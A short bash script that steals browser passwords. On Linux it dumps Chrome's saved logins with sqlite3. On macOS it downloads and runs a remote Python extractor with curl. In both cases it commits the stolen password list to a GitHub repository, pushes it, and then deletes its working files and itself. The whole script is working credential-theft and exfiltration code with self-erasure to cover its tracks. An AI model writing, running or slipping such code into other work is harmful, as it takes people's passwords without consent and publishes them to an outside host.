#!/bin/bash
dist=`uname -s`
filename=`id -un`-pwlist

case "$dist" in
  Linux)
    echo "Linux Extractor"
    sqlite3 -csv -header '/tmp/chrome-tmp/Default/Login Data' "select * from logins" >> $USER-pwlist.csv
    ;;
  Darwin)
    echo "Mac OS Extractor"
    curl hkn.gafner.eu/scripts/macPwExt.py >> ext.py
    python ext.py >> $filename
    rm -rf ext.py
    ;;
  *)
    echo "unknowm distribution"
    exit 1
esac

git clone https://github.com/timogafner/pw-list.git
mv $filename* pw-list
cd pw-list
git add $filename*
git commit -m "`id -un` pwlist"
git push
cd ..
rm -rf pw-list
rm -rf $0
